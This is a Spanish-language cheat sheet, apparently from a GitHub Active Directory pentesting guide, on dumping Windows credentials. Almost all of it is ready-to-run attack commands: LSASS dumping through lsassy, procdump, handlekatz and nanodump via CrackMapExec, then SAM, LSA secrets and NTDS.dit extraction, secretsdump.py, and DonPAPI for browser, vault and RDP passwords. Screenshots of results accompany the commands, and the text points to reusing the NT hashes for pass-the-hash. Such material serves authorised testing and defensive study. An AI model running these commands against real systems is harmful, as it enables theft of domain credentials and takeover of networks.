# LSASS

Las credenciales que se almacenan en este proceso habitualmente son aquellas que tienen una sesion actualmente en el equipo. Se obtientienen en formato NTLM, por lo que es posible usar el NT para hacer Pass-th-hash.

```Bash
# Lsassy
lsassy -v -u <user> -p '<pass>' -m rdrleakdiag --dump-name test.log <Target IP>
# o
cme smb <Target IP> -u <user> -p '<pass>' -M lsassy
# Procdump
cme smb <Target IP> -u <user> -p '<pass>' -M procdump
# Handlekatz
cme smb <Target IP> -u <user> -p '<pass>' -M handlekatz
# Nanodump
cme smb <Target IP> -u <user> -p '<pass>' -M nanodump
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img1.png?raw=true "lsassy 1")
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img2.png?raw=true "lsassy 2")
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img3.png?raw=true "Procdump")
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img4.png?raw=true "Handlekatz")
![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img5.png?raw=true "Nanodump")


# SAM

Las credenciales que se almacenan en este componente son las locales del sistema. Se obtientienen en formato NTLM, por lo que es posible usar el NT para hacer Pass-th-hash.

```Bash
# Crackmapexec
cme smb <Target IP> -u <user> -p '<pass>' --sam
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img6.png?raw=true "SAM")

# LSA

Las credenciales que se almacenan en este componente son aquellas que se encuentran en cache. Por lo general cifradas, pero alguna vez en claro.

```Bash
# Crackmapexec
cme smb <Target IP> -u <user> -p '<pass>' --lsa
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img7.png?raw=true "LSA")

# NTDS

Esta BBDD del AD solo se encuentra en los DC y es donde se almacenan todas las credenciales del dominio. Se obtientienen en formato NTLM, por lo que es posible usar el NT para hacer Pass-th-hash.

```Bash
# Crackmapexec
cme smb <Target IP> -u <user> -p '<pass>' --ntds
# o
cme smb <Target IP> -u <user> -p '<pass>' -M ntdsutil
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img8.png?raw=true "NTDS")


# MULTIPLES CREDS

```Bash
# Secretsdump - SAM/LSA/NTDS
secretsdump.py <Dominio>/<user>:'<pass>'@<Target IP>
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img9.png?raw=true "Secretsdump")

```Bash
# DonPAPI - Windows creds/Vaults/RDP/certificates/AdConnect/Internet explorer/Chrome/Firefox/VNC/mRemoteNG passwords
DonPAPI <Dominio>/<user>:'<pass>'@<Target IP>
# Es posible sacar un reporte en html ejecutando el comando donde se encuentre la BBDD
DonPAPI -R
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/get_windows_creds/files/img10.png?raw=true "DoPAPI")